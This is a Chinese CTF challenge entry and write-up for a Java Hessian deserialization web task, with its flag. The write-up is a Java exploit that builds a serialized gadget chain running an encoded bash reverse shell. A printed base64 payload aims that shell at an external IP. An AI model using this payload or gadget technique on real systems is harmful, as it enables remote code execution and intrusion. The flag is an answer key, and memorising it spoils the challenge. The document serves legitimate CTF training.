- **题目名称：** hessian_checkin
- **题目类型：** WEB
- **题目难度：** 中等
- **出题人：** ABU
- **考点：**
1. java hessian反序列化漏洞
- **描述：** 听说hessian反序列化比原生的快很多，我立马写了个服务来测试看看！！！
- **flag：** XSCTF{81f989bf-31d2-4f82-93a9-2c2ee44630d8}
- **Writeup：** 

```java
package com;

import com.xsctf.checkin.proxy.User;
import com.xsctf.checkin.proxy.UserImpl;
import com.xsctf.checkin.proxy.UserInvocationHandler;
import com.xsctf.checkin.utils.UserFun;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.util.Base64;

public class exp {
    public static void main(String[] args) throws Exception {
        //实例化userFun，传入Rumtime的exec方法名和对应的参数，即要执行的命令，这里打反弹shell最好，由于空格，尖括号等原因在https://x.hacking8.com/?post=293这里修改一下方式
        UserFun userFun = new UserFun("exec", new Class[]{String.class}, new Object[]{"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMzA2NjAgMD4mMQ==}|{base64,-d}|{bash,-i}"});
        //通过实现类获取User对象（接口不可以直接实例化）
        User user = new UserImpl();
        //user.getClass()来获取Class，反射获取属性
        Field input = user.getClass().getDeclaredField("input");
        //由于属性私有，需要强制设置成可以属性可设
        input.setAccessible(true);
        //inoput属性设置成UserFun对象
        input.set(user,userFun);
        //实例化动态代理类
        UserInvocationHandler userInvocationHandler = new UserInvocationHandler(user);
        //生成一个动态代理
        User proxy = (User) Proxy.newProxyInstance(exp.class.getClassLoader(), user.getClass().getInterfaces(), userInvocationHandler);
        //UserIn类不是public，不能在外部实例化，可以用forName来获取Class
        Class c = Class.forName("com.xsctf.checkin.utils.UserIn");
        //反射获取构造方法
        Constructor constructor = c.getDeclaredConstructor(boolean.class,User.class);
        constructor.setAccessible(true);
        //反射初始化构造方法
        Object o = constructor.newInstance(true, proxy);
        System.out.println(serial(o));
        deserial(serial(o));
    }
    public static String serial(Object o) throws IOException, NoSuchFieldException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();
        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }
    public static void deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
//rO0ABXNyAB5jb20ueHNjdGYuY2hlY2tpbi51dGlscy5Vc2VySW5gHAEMJcn2pwIAAloABGZsYWdMAAR1c2VydAAeTGNvbS94c2N0Zi9jaGVja2luL3Byb3h5L1VzZXI7eHABc30AAAACABxjb20ueHNjdGYuY2hlY2tpbi5wcm94eS5Vc2VyABRqYXZhLmlvLlNlcmlhbGl6YWJsZXhyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyAC1jb20ueHNjdGYuY2hlY2tpbi5wcm94eS5Vc2VySW52b2NhdGlvbkhhbmRsZXLGBKwg6+HowQIAAUwABHVzZXJxAH4AAXhwc3IAIGNvbS54c2N0Zi5jaGVja2luLnByb3h5LlVzZXJJbXBscnKnFdn3EQICAAFMAAVpbnB1dHQAIUxjb20veHNjdGYvY2hlY2tpbi91dGlscy9Vc2VyRnVuO3hwc3IAH2NvbS54c2N0Zi5jaGVja2luLnV0aWxzLlVzZXJGdW7ffrOKO/rVXgIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAF0AGFiYXNoIC1jIHtlY2hvLFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNakV1TlM0eU16Z3VOVEl2TXpBMk5qQWdNRDRtTVE9PX18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9dAAEZXhlY3VyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cA==
```

![image-20231021010252189](C:\Users\24063\AppData\Roaming\Typora\typora-user-images\image-20231021010252189.png)
